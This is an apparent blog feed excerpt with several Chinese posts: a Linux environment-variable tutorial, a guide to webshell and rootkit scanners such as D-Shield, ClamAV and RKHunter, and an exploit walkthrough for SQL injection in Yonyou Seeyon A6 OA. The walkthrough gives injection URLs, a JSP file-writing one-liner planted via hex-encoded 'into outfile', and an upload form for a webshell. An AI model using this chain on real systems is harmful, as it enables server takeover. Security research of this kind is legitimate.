style="display:none">U2FsdGVkX1+YgGH2LlSs4KcXnjgEhJ/nrTSy9Z/+AWehdkwRVhQe0Pll0IGybbr+xeG/RPLl0/84sLh5PIiDIhlGyY6TiLx8Ys9TSJ/AT1+zj2FgNOwFOvGzKNTpLBxsxQyKlFuVDLelXHAyeGEgC3u0DT3CpjX/z5FxyP7mRe3/OUPHCcCOEm4H2/upY7pCKOSGofyq4DB/4z3YWztZhvVf3r4Bi72GApQOtAaJ1lHV/f4rtQ9iPfAHyncGHu6IlS2ox6hESdDJYu1pneBELMZQIUKPlXeqIuPryg5uriTQvRRJEHrFb/nuFWP1jUOxP4deZ40ue+68f/FGNHrgvc1gerHEF3Q1gEo5pN8KNZnkbbr/6FQ/4oyOmzK5C+u6GQZICdaGP5WslGa1T2k8ghnhCWUl4ZpnVIu1/e4IidiWBzyavTmHCHuW/WOJdPcVEddXSHFRGiAatN81c/NsrQRU7kuyzwS1IuXIHu4or5GxNRPSR9BE9iLGEPkg/8e2h425ZBIwekB1jzXJqnoy2ERU4CieLlmfD0rwvktinyWsXZDzicvq5xUrWpt4Jmcn4kFdD+HOHpw8/YrOEdTgDBhSF4QAsrtX0UvYqUs6YgHAQN3a2QTOy1omGq8sC4E58dJPbNP8Upo5IoK6k24n/YAYhSWFHcW8S69GFzm4XNgYOfzNdsuUfV91XkboWp8g7WP4yjkylayLAcQDucVkVBokknFdNAu5AzWtYaungywxL1KLzLdK65R23Qc7wMpQWTaQuZc+7MrkY/Qq1jLbxf2/NoazuPbJNGK3yqeR7Cvn9JkWDlYDrR9yPxKk1ZUHKTL+USwszQDzRxg/XcI02SFKBgyDq2PzzPhcZsracohMSF6D+w8/9CJFWX+qPHfZTXwZoIqQlwUdQbmyQYCLXfv+Brq1EB87CwXwZUbuzVTIMw57azVMlxWmsVbnKnSbrsGcrb2+Z/Px2K+DSexzNxNOkBvU1Y64Z5F/P5gDrZW0rJHcXfINSgXb8+QFyQeEnpylyDtJR/eowU1JCpoB6bSuQ7W8lm487U/df+g2ya7+A4QCMI2LpN8fmaK7BptKFrtrffjH5y6edUjMLM4TomHQRKow/QhA4DGDTXOK9fvPEyCyg6I3QvePhYk8S+L3Kr9DkAP0fXBTQC4u2ZqF9dT8kNbh8qW4a2Idc0MVFG58DM5zlfL2WXMJlH59X/inXTwBL/8pAXZW1FwaxbkA2HpOVY8wYWq+bOcXjxesjdb5v73MEeTvcz/lJJEu0OAmtMoGgK2kg1Fq64tv62z2SoDflT+a696/uPHANuh0qQRmoTlo6pTnGbFLVAz77E7HEQ8d/sa7eIdZIB34NCNPMQb9gO/4BAR6x5kcXgfg8jUkii6m/j3ANKQcnhUU35KanWkl0hHWVDlM6csrG2tkSLRP5r6uk8xwQtG9b4FHALuolNmx5IKkdUgnbS4mGiujkLfBTVrqXJqktaFJ2jpq8aebWuYhK5oo3OQgBIrA2hkEJ/aKCwDtLJ2CgsHtIo6IN81pJd5eFctULddWFyo9NRSb4mH9hCgiGUnaMlHYiqg0Ldhs+RPjfg0QUdPiFb+eu8GKHxuwFslsncLOH6la8TPm4CmQEnxVN31iMD2WV3Bn3SY0BBgt+ZknpQaDpv4vXwtFuESCsvzBEtyXF6Rh+cRqlHVt8NMlc6mM/DZHxUPyd/Nm631riT1IzDWqfFdv</div><div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div><script>var onError = function(error) {document.getElementById("enc_error").innerHTML = "password error!"};function decrypt() {var passwd = document.getElementById("enc_pwd_input").value;console.log(passwd);doDecrypt(passwd, onError);}</script></div>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;如不需要对文章进行加密请去掉&quot;&gt;&lt;a href=&quot;#如不需要对文章进行加密请去掉&quot; class=&quot;headerlink&quot; title=&quot;如不需要对文章进行加密请去掉&quot;&gt;&lt;/a&gt;如不需要对文章进行加密请去掉&lt;/h1&gt;&lt;figure class=&quot;highlight yaml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;encrypt:&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;enc_pwd:&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;123456&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&quot;如不需要目录请去掉&quot;&gt;&lt;a href=&quot;#如不需要目录请去掉&quot; class=&quot;headerlink&quot; title=&quot;如不需要目录请去掉&quot;&gt;&lt;/a&gt;如不需要目录请去掉&lt;/h1&gt;&lt;figure class=&quot;highlight yaml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;toc:&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&quot;添加摘要&quot;&gt;&lt;a href=&quot;#添加摘要&quot; class=&quot;headerlink&quot; title=&quot;添加摘要&quot;&gt;&lt;/a&gt;添加摘要&lt;/h1&gt;
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux环境变量设置</title>
    <link href="http://www.pa55w0rd.club/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E8%AE%BE%E7%BD%AE/"/>
    <id>http://www.pa55w0rd.club/环境变量设置/</id>
    <published>2018-12-05T06:56:46.000Z</published>
    <updated>2018-12-05T07:27:47.655Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-查看环境变量"><a href="#0x00-查看环境变量" class="headerlink" title="0x00 查看环境变量"></a>0x00 查看环境变量</h2><p>查看环境变量有三个命令：</p><ul><li>env：env命令是environment的缩写，用于列出所有的环境变量</li><li>export：单独使用export命令也可以像env列出所有的环境变量，不过export命令还有其他额外的功能</li><li><code>echo $PATH</code>：<code>echo $PATH</code>用于列出变量PATH的值，里面包含了已添加的目录</li></ul><a id="more"></a><h2 id="0x01-设置环境变量"><a href="#0x01-设置环境变量" class="headerlink" title="0x01 设置环境变量"></a>0x01 设置环境变量</h2><h3 id="1-1-将路径加入到PATH"><a href="#1-1-将路径加入到PATH" class="headerlink" title="1.1 将路径加入到PATH"></a>1.1 将路径加入到PATH</h3><p>可以直接添加到环境变量PATH中。$PATH表示变量PATH的值，包含已有的目录。</p><p>这种方法需要注意路径的顺序，如果遇到有同名的命令，那么PATH里面哪个目录先被查询，则那个目录下的命令就会被先执行，如下所示：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 加到PATH末尾</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/path/to/your/dir</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加到PATH开头</span></span><br><span class="line"><span class="built_in">export</span> PATH=/path/to/your/dir:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure></p><h3 id="1-2-命名一个新的环境变量"><a href="#1-2-命名一个新的环境变量" class="headerlink" title="1.2 命名一个新的环境变量"></a>1.2 命名一个新的环境变量</h3><p>也可以直接命名一个新的环境变量，用于其它程序引用：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> VAR_NAME=value</span><br></pre></td></tr></table></figure></p><h2 id="0x02-作用域"><a href="#0x02-作用域" class="headerlink" title="0x02 作用域"></a>0x02 作用域</h2><h3 id="2-1-作用于当前终端"><a href="#2-1-作用于当前终端" class="headerlink" title="2.1 作用于当前终端"></a>2.1 作用于当前终端</h3><p>打开一个终端，输入添加环境变量的语句：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> CLASS_PATH=./JAVA_HOME/lib:<span class="variable">$JAVA_HOME</span>/jre/lib</span><br></pre></td></tr></table></figure></p><p>终端所添加的环境变量是临时的，只适用于当前终端，关闭当前终端或在另一个终端中，添加的环境变量无效。</p><h3 id="2-2-作用于当前用户"><a href="#2-2-作用于当前用户" class="headerlink" title="2.2 作用于当前用户"></a>2.2 作用于当前用户</h3><p>如果只需要添加的环境变量对当前用户有效，可以写入用户主目录下的.bashrc文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.bashrc</span><br></pre></td></tr></table></figure></p><p>添加语句：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> CLASS_PATH=./JAVA_HOME/lib:<span class="variable">$JAVA_HOME</span>/jre/lib</span><br></pre></td></tr></table></figure></p><p>注销或者重启可以使修改生效，如果要使添加的环境变量马上生效：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure></p><h3 id="2-3-作用于所有用户"><a href="#2-3-作用于所有用户" class="headerlink" title="2.3 作用于所有用户"></a>2.3 作用于所有用户</h3><p>要使环境变量对所有用户有效，可以修改profile文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/profile</span><br></pre></td></tr></table></figure></p><p>添加语句：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> CLASS_PATH=./JAVA_HOME/lib:<span class="variable">$JAVA_HOME</span>/jre/lib</span><br></pre></td></tr></table></figure></p><p>注销或者重启可以使修改生效，如果要使添加的环境变量马上生效：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure></p><hr><p><strong>说明：</strong></p><p>bash首先执行/etc/profile脚本,/etc/profile脚本先依次执行/etc/profile.d/*.sh </p><p>随后bash会执行用户主目录下的.bash_profile脚本,.bash_profile脚本会执行用户主目录下的.bashrc脚本,<br>而.bashrc脚本会执行/etc/bashrc脚本</p><p>至此,所有的环境变量和初始化设定都已经加载完成</p><p>bash随后调用terminfo和inputrc，完成终端属性和键盘映射的设定</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-查看环境变量&quot;&gt;&lt;a href=&quot;#0x00-查看环境变量&quot; class=&quot;headerlink&quot; title=&quot;0x00 查看环境变量&quot;&gt;&lt;/a&gt;0x00 查看环境变量&lt;/h2&gt;&lt;p&gt;查看环境变量有三个命令：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;env：env命令是environment的缩写，用于列出所有的环境变量&lt;/li&gt;
&lt;li&gt;export：单独使用export命令也可以像env列出所有的环境变量，不过export命令还有其他额外的功能&lt;/li&gt;
&lt;li&gt;&lt;code&gt;echo $PATH&lt;/code&gt;：&lt;code&gt;echo $PATH&lt;/code&gt;用于列出变量PATH的值，里面包含了已添加的目录&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
      <category term="linux" scheme="http://www.pa55w0rd.club/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>用友致远A6 OA存在sql注入并拿shell</title>
    <link href="http://www.pa55w0rd.club/yyoa/"/>
    <id>http://www.pa55w0rd.club/yyoa/</id>
    <published>2018-12-04T08:11:57.000Z</published>
    <updated>2018-12-04T09:00:29.022Z</updated>
    
    <content type="html"><![CDATA[<p>用友致远A6协同系统 <code>/yyoa/common/js/menu/test.jsp</code> 文件 S1 参数SQL注入漏洞 </p><p>注入点为S1变量，通过探测，发现是mysql数据库</p><p><code>http://xx/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=</code></p><p>于是构造注入语句查询数据库名：</p><p><code>http://xx/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=(SELECT%20database())</code></p><a id="more"></a><table><thead><tr><th>序号</th><th>database()</th></tr></thead><tbody><tr><td>1</td><td>mysql3235</td></tr></tbody></table><p>Mysql注入中，我们使用into outfile 来写入数据，用此方法注入webshell，前提条件两个：</p><p>1：root权限</p><p>2：物理路径</p><p>我们探测一下web根目录</p><p><code>http://xx/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=(SELECT%20@@basedir)</code></p><table><thead><tr><th>序号</th><th>@@basedir</th></tr></thead><tbody><tr><td>1</td><td>F:/UFseeyon/OA/mysql/bin/../</td></tr></tbody></table><p>通过yyoa目录结构猜测物理路径为</p><p><code>F:/UFseeyon/OA/tomcat/webapps/yyoa/</code></p><p>可以使用load_file判断是否正确</p><p><code>http://xx/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=select%20load_file(%27F:/UFseeyon/OA/tomcat/webapps/yyoa/WEB-INF/web.xml%27)</code></p><p>利用mysql into outfile写shell：由于jsp一句话超长，请求连接会拒绝，故先上传写文件脚本，再本地构造进行webshell上传：<br><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="keyword">if</span>(request.getParameter(<span class="string">"f"</span>)!=<span class="keyword">null</span>)(<span class="keyword">new</span> java.io.FileOutputStream(application.getRealPath(<span class="string">"\\"</span>)+request.getParameter(<span class="string">"f"</span>))).write(request.getParameter(<span class="string">"t"</span>).getBytes());%&gt;</span><br></pre></td></tr></table></figure></p><p>由于特殊符号存在，URL编码会造成写入后代码错误，故采用hex编码后unhex处理上传，写入文件名为：he1p.jsp</p><p><a href="http://xx/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=select%20unhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27)%20%20into%20outfile%20%27F:/UFseeyon/OA/tomcat/webapps/yyoa/he1p.jsp%27" target="_blank" rel="noopener">http://xx/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=select%20unhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27)%20%20into%20outfile%20%27F:/UFseeyon/OA/tomcat/webapps/yyoa/he1p.jsp%27</a></p><p>本地构造上传：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://xx/yyoa/he1p.jsp?f=we1come.jsp"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">t</span> <span class="attr">cols</span>=<span class="string">120</span> <span class="attr">rows</span>=<span class="string">10</span> <span class="attr">width</span>=<span class="string">45</span>&gt;</span>your code<span class="tag">&lt;/<span class="name">testarea</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>上传后获取webshell地址为：<a href="http://xx/yyoa/we1come.jsp" target="_blank" rel="noopener">http://xx/yyoa/we1come.jsp</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;用友致远A6协同系统 &lt;code&gt;/yyoa/common/js/menu/test.jsp&lt;/code&gt; 文件 S1 参数SQL注入漏洞 &lt;/p&gt;
&lt;p&gt;注入点为S1变量，通过探测，发现是mysql数据库&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://xx/yyoa/common/js/menu/test.jsp?doType=101&amp;amp;S1=&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;于是构造注入语句查询数据库名：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://xx/yyoa/common/js/menu/test.jsp?doType=101&amp;amp;S1=(SELECT%20database())&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://www.pa55w0rd.club/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全" scheme="http://www.pa55w0rd.club/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="sql注入" scheme="http://www.pa55w0rd.club/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Linux后门入侵检测工具使用</title>
    <link href="http://www.pa55w0rd.club/linux-backdoor-killer/"/>
    <id>http://www.pa55w0rd.club/linux-backdoor-killer/</id>
    <published>2018-12-03T07:07:05.000Z</published>
    <updated>2018-12-04T08:58:50.674Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-描述"><a href="#0x00-描述" class="headerlink" title="0x00 描述"></a>0x00 描述</h2><p>当我们的应用系统被入侵后，系统是否已被黑客上传webshell甚至植入木马后门程序。如果依靠人工排查，一是工作量大，二是需要一定程度的技术知识和业务知识才能判断什么是正常什么是异常。工作量大决定排查工作不可能由个别具有技术知识和业务知识的人来完成工作而需要其他人员参与，而如果这些没有“一定程度的技术知识和业务知识”的人员参与基本必然后导致大量的误报和漏报（主要是漏报）。总而言之，在大量设备场景中人工排查后门是很难切实有效推行的排查手段。</p><h2 id="0x01-Webshell查杀"><a href="#0x01-Webshell查杀" class="headerlink" title="0x01 Webshell查杀"></a>0x01 Webshell查杀</h2><h3 id="1-1-D盾-Web查杀"><a href="#1-1-D盾-Web查杀" class="headerlink" title="1.1 D盾_Web查杀"></a>1.1 D盾_Web查杀</h3><p>D盾Web查杀是一个永久免费的网站D盾Web查杀，软件使用自行研发不分扩展名的代码分析引擎，能分析更为隐藏的WebShell后门行为</p><p>引擎特别针对：一句话后门、变量函数后门、${}执行、`执行、preg_replace执行、call_user_func、file_put_contents、fputs 等特殊函数的参数进行针对性的识别，能查杀更为隐藏的后门，并把可疑的参数信息展现在你面前，让你能更快速的了解后门的情况</p><blockquote><p>PS: 不再更新D盾_web查杀的查杀引擎,只更新查杀库到2019.1.1，之后将不再更新查杀库<br><a id="more"></a></p></blockquote><h4 id="安装使用"><a href="#安装使用" class="headerlink" title="安装使用"></a>安装使用</h4><p><a href="http://www.d99net.net/down/WebShellKill_V2.0.9.zip" target="_blank" rel="noopener">D盾_WEB查杀V2.0.9 下载链接</a></p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># D盾只有win版的，需要把源代码打包下来进行扫描，或使用nfs共享目录挂载到windows系统</span></span><br><span class="line"><span class="meta"># 这里使用tar把源码打包下来进行扫描</span></span><br><span class="line">tar -cvf webshell.tar webshell/</span><br></pre></td></tr></table></figure><img src="/linux-backdoor-killer/D盾.png" title="D盾webshell查杀"><h3 id="1-2-深信服WebShellkiller"><a href="#1-2-深信服WebShellkiller" class="headerlink" title="1.2 深信服WebShellkiller"></a>1.2 深信服WebShellkiller</h3><p>WebShellkiller作为一款web后门专杀工具，不仅支持webshell的扫描，同时还支持暗链的扫描。这是一款融合了多重检测引擎的查杀工具。在传统正则匹配的基础上，采用模拟执行，参数动态分析监测技术、webshell语义分析技术、暗链隐藏特征分析技术，并根据webshell的行为模式构建了基于机器学习的智能检测模型。传统技术与人工智能技术相结合、静态扫描和动态分析相结合，更精准地检测出WEB网站已知和未知的后门文件。</p><h4 id="安装使用-1"><a href="#安装使用-1" class="headerlink" title="安装使用"></a>安装使用</h4><p><a href="http://edr.sangfor.com.cn/tool/WebShellKillerTool.zip" target="_blank" rel="noopener">Windows</a><br><a href="http://edr.sangfor.com.cn/tool/WebShellKillerForLinux.tar.gz" target="_blank" rel="noopener">Linux</a><br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># Windows平台同D盾</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># linux平台</span></span><br><span class="line"><span class="meta"># 下载WebShellkiller</span></span><br><span class="line">wget http:<span class="comment">//edr.sangfor.com.cn/tool/WebShellKillerForLinux.tar.gz</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 解压到当前目录</span></span><br><span class="line">tar -zxvf WebShellKillerForLinux.tar.gz </span><br><span class="line"><span class="meta"># 查看解压结果，可以看到多出centos_32、centos_64、linux_64三个文件夹</span></span><br><span class="line"><span class="meta"># 查看当前系统版本</span></span><br><span class="line">cat /etc/system-release &amp;&amp; uname -m</span><br><span class="line"></span><br><span class="line"><span class="meta"># 进入centos_64</span></span><br><span class="line">cd centos_64/wscan_app/</span><br><span class="line"></span><br><span class="line"><span class="meta"># wscan 默认没有可执行权限</span></span><br><span class="line">chmod u+x wscan</span><br><span class="line"></span><br><span class="line"><span class="meta"># wscan从LD_LIBRARY_PATH加载so文件，需要将当前路径加到LD_LIBRARY_PATH以使wscan能找到当前目录下的so</span></span><br><span class="line">export LD_LIBRARY_PATH=`pwd`:$LD_LIBRARY_PATH</span><br><span class="line"></span><br><span class="line"><span class="meta"># 执行扫描</span></span><br><span class="line">./wscan -hrf ../../webshell/jsp</span><br></pre></td></tr></table></figure></p><h3 id="1-3-CloudWalker（牧云）"><a href="#1-3-CloudWalker（牧云）" class="headerlink" title="1.3 CloudWalker（牧云）"></a>1.3 CloudWalker（牧云）</h3><p>CloudWalker（牧云）是长亭推出的一款开源服务器安全管理平台。根据项目计划会逐步覆盖服务器资产管理、威胁扫描、Webshell 查杀、基线检测等各项功能。</p><p>本次开源作为开源计划的第一步，仅包含 Webshell 检测引擎部分，重点调优 Webshell 检测效果。目前放出的是一个可执行的命令行版本 Webshell 检测工具。</p><h4 id="安装使用-2"><a href="#安装使用-2" class="headerlink" title="安装使用"></a>安装使用</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 工具打包形式为单个可执行文件，下载之后添加可执行权限即可执行。</span></span><br><span class="line">wget https:<span class="regexp">//gi</span>thub.com<span class="regexp">/chaitin/</span>cloudwalker<span class="regexp">/releases/</span>download<span class="regexp">/webshell-detector-1.0.0/</span>webshell-detector-<span class="number">1.0</span>.<span class="number">0</span>-linux-amd64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用</span></span><br><span class="line">.<span class="regexp">/webshell-detector -html -output result.html /</span>var<span class="regexp">/www/</span>webshell<span class="regexp">/</span></span><br></pre></td></tr></table></figure><h2 id="木马后门类查杀"><a href="#木马后门类查杀" class="headerlink" title="木马后门类查杀"></a>木马后门类查杀</h2><p>可以设置定时任务定期查杀</p><h3 id="2-1-ClamAV"><a href="#2-1-ClamAV" class="headerlink" title="2.1 ClamAV"></a>2.1 ClamAV</h3><p>ClamAV是一个在命令行下查毒软件，是免费开源产品，支持多种平台，如：Linux/Unix、MAC OS X、Windows、OpenVMS。ClamAV是基于病毒扫描的命令行工具，但同时也有支持图形界面的ClamTK工具。为什么说是查毒软件呢，因为它不将杀毒作为主要功能，默认只能查出您服务器内的病毒，但是无法清除，至多删除文件。不过这样，已经对我们有很大帮助了。</p><h4 id="安装使用-3"><a href="#安装使用-3" class="headerlink" title="安装使用"></a>安装使用</h4><p>clamav的官方网站是<a href="http://www.clamav.net，" target="_blank" rel="noopener">http://www.clamav.net，</a> 可以从<a href="http://www.clamav.net/downloads" target="_blank" rel="noopener">http://www.clamav.net/downloads</a> 下载最新版本，也可以通过yum在线安装clamav，因为clamav包含在epel源中，所以方便起见，通过yum安装最简单。也可以编译安装<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Yum安装clamav</span></span><br><span class="line">yum <span class="keyword">install</span> epel-<span class="keyword">release</span></span><br><span class="line">yum -y <span class="keyword">install</span> clamav clamav-milter</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新病毒库</span></span><br><span class="line">freshclam</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行扫描</span></span><br><span class="line">clamscan -r -l scan.log /<span class="keyword">var</span>/www/webshell</span><br><span class="line">-r 表示递归扫描子目录</span><br><span class="line">-l 增加扫描报告</span><br><span class="line"><span class="keyword">move</span> [路径] 表示移动病毒文件到指定的路径</span><br><span class="line">remove [路径] 表示扫描到病毒文件后自动删除病毒文件</span><br></pre></td></tr></table></figure></p><h3 id="2-2-rookit"><a href="#2-2-rookit" class="headerlink" title="2.2 rookit"></a>2.2 rookit</h3><p>rootkit是Linux平台下最常见的一种木 马后门工具，它主要通过替换系统文件来达到攻 击和和隐蔽的目的，这种木 马比普通木 马后门更加危险和隐蔽，普通的检测工具和检查手段很难发现这种木 马。rootkit攻 击能力极强，对系统的危害很大，它通过一套工具来建立后门和隐藏行迹，从而让攻 击者保住权限，以使它在任何时候都可以使用root权限登录到系统。</p><p>一般杀毒软件运行于ring3级别只能查杀ring3级别的木马，rookit是运行于ring0级别的木马，所以查杀rootkit也需要ring0级杀毒程序。Rootkit Hunter正是一款专门查杀rootkit的软件。</p><h4 id="2-2-1-RKHunter"><a href="#2-2-1-RKHunter" class="headerlink" title="2.2.1 RKHunter"></a>2.2.1 RKHunter</h4><p>Rkhunter的中文名叫“Rootkit猎手”, 目前可以发现大多数已知的rootkits和一些嗅探器以及后门程序。它通过执行一系列的测试脚本来确认服务器是否已经感染rootkits，比如检查rootkits使用的基本文件，可执行二进制文件的错误文件权限，检测内核模块等等。在官方的资料中，RKHunter可以作的事情有：</p><ol><li>MD5校验测试，​检测文件是否有改动</li><li>检测rootkit使用的二进制和系统工具文件</li><li>检测特洛伊木 马程序的特征码</li><li>检测常用程序的文件属性是否异常</li><li>检测系统相关的测试</li><li>检测隐藏文件</li><li>检测可疑的核心模块LKM</li><li>检测系统已启动的监听端口</li></ol><h5 id="安装使用-4"><a href="#安装使用-4" class="headerlink" title="安装使用"></a>安装使用</h5><p><a href="http://rootkit.nl/projects/rootkit_hunter.html" target="_blank" rel="noopener">官方地址</a><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># yum安装rkhunter</span></span><br><span class="line">yum <span class="keyword">install</span> epel-<span class="keyword">release</span></span><br><span class="line">yum <span class="keyword">install</span> rkhunter</span><br><span class="line"></span><br><span class="line"><span class="comment"># 常用的几个参数选项有：</span></span><br><span class="line">c, <span class="comment">--check 必选参数，表示检测当前系统</span></span><br><span class="line">configfile &lt;<span class="keyword">file</span>&gt; 使用特定的配置文件</span><br><span class="line">cronjob   